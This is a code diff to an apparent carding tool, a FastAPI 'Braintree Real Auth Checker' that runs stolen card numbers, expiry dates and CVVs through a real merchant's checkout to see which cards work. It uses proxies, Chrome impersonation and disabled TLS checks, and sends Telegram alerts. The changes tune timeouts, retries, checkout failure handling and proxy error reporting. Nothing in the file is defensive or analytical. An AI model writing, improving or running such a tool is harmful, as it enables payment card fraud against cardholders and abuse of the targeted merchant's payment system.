@@ -25,7 +25,7 @@ logging.basicConfig(
 )
 logger = logging.getLogger("ollie.weareteachers.checker")
 
-app = FastAPI(title="WeAreTeachers Braintree Real Auth Checker", version="9.7.0")
+app = FastAPI(title="WeAreTeachers Braintree Real Auth Checker", version="9.8.0")
 
 RAW_DORK_GATES: dict[str, dict[str, str]] = {
     "weareteachers_bt": {
@@ -126,7 +126,6 @@ def is_card_expired(mm: str, yy: str) -> bool:
     try:
         month = int(mm)
         full_year = int(f"20{yy}" if len(yy) == 2 else yy)
-        # Updated current date check to January 2026 so 02/26 cards are valid
         current_year = 2026
         current_month = 1
         if full_year < current_year:
@@ -160,7 +159,7 @@ async def fetch_bin_metadata(card_number: str, proxies: dict[str, str] | None = 
     bin_code = card_number[:6]
     default_meta = {"bank": "Unknown Bank", "country": "US", "scheme": "CARD", "type": "CREDIT"}
     try:
-        async with AsyncSession(impersonate="chrome124", proxies=proxies, verify=False, timeout=10) as session:
+        async with AsyncSession(impersonate="chrome124", proxies=proxies, verify=False, timeout=8) as session:
             resp = await session.get(
                 f"https://lookup.binlist.net/{bin_code}",
                 headers={"Accept-Version": "3"},
@@ -264,7 +263,7 @@ async def fetch_braintree_fingerprint(session: AsyncSession, client_token_nonce:
                 "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
                 "x-requested-with": "XMLHttpRequest",
             },
-            timeout=10,
+            timeout=8,
         )
         if r.status_code != 200:
             return None
@@ -325,11 +324,13 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
     }
     session_id = str(uuid.uuid4())
 
-    await session.get(product_url, headers={"accept": "text/html", "user-agent": ua, "referer": host + "/"}, timeout=10)
-    co = await session.get(checkout_url, headers={"accept": "text/html", "user-agent": ua, "referer": product_url}, timeout=15)
-    
-    if "/checkout" not in co.url:
-        return "DECLINED", "Checkout redirected (empty cart)", 200
+    prod_res = await session.get(product_url, headers={"accept": "text/html", "user-agent": ua, "referer": host + "/"}, timeout=10)
+    if prod_res.status_code >= 400:
+        return "DECLINED", f"Product load failed HTTP {prod_res.status_code}", prod_res.status_code
+
+    co = await session.get(checkout_url, headers={"accept": "text/html", "user-agent": ua, "referer": product_url}, timeout=12)
+    if co.status_code >= 400 or "/checkout" not in co.url:
+        return "DECLINED", f"Checkout load failed HTTP {co.status_code}", co.status_code
 
     html = co.text
     tokens = extract_checkout_tokens(html)
@@ -437,7 +438,7 @@ async def execute_weareteachers_auth(session: AsyncSession, cc: str, mm: str, yy
         store_checkout_url,
         data=json.dumps(checkout_payload),
         headers=checkout_headers,
-        timeout=15
+        timeout=12
     )
     try:
         jj = rr.json()
@@ -507,7 +508,7 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
         "Accept-Language": "en-US,en;q=0.9",
     }
 
-    max_retries = 2
+    max_retries = 1
     last_exc = None
 
     for attempt in range(max_retries + 1):
@@ -517,7 +518,7 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
                 proxies=proxies_dict,
                 headers=browser_headers,
                 verify=False,
-                timeout=25,
+                timeout=20,
             ) as session:
                 status, reason, code = await execute_weareteachers_auth(session, cc, mm, yy, cvv)
 
@@ -536,15 +537,21 @@ async def run_auth_check(card_line: str, proxy_url: str | None = None, target_ke
         except Exception as exc:
             last_exc = exc
             if attempt < max_retries:
-                await asyncio.sleep(1.0)
+                await asyncio.sleep(0.5)
                 continue
             break
 
     bin_info = await bin_task
     elapsed = (time.perf_counter() - started) * 1000
+    err_str = str(last_exc)
+    if "SSL" in err_str or "TLS" in err_str:
+        clean_reason = "Proxy SSL/TLS Handshake Failed (Dead Proxy)"
+    else:
+        clean_reason = f"Network Error / Proxy Failed: {type(last_exc).__name__}"
+
     return AuthVerdict(
         status="DECLINED",
-        reason=f"Network Error / Proxy Failed: {type(last_exc).__name__}: {str(last_exc)[:70]}",
+        reason=clean_reason,
         latency_ms=elapsed,
         bin_info=bin_info,
         target_used=gate["name"],
@@ -558,8 +565,8 @@ async def test_proxy(proxy: str) -> dict[str, Any]:
     start = time.perf_counter()
     proxies_dict = parse_proxy_string(proxy)
     try:
-        async with AsyncSession(impersonate="chrome124", proxies=proxies_dict, verify=False, timeout=10) as session:
-            resp = await session.get("https://api.ipify.org?format=json", timeout=6)
+        async with AsyncSession(impersonate="chrome124", proxies=proxies_dict, verify=False, timeout=8) as session:
+            resp = await session.get("https://api.ipify.org?format=json", timeout=5)
             latency = (time.perf_counter() - start) * 1000
             if resp.status_code == 200:
                 ip_val = resp.json().get("ip", "OK")
@@ -583,8 +590,8 @@ async def check_card_endpoint(
 async def send_telegram_alert(token: str = Query(...), chat_id: str = Query(...), message: str = Query(...)) -> dict[str, Any]:
     tg_url = f"https://api.telegram.org/bot{token}/sendMessage"
     try:
-        async with AsyncSession(verify=False, timeout=10) as session:
-            resp = await session.post(tg_url, data={"chat_id": chat_id, "text": message}, timeout=10)
+        async with AsyncSession(verify=False, timeout=8) as session:
+            resp = await session.post(tg_url, data={"chat_id": chat_id, "text": message}, timeout=8)
             if resp.status_code == 200:
                 return {"success": True}
     except Exception:
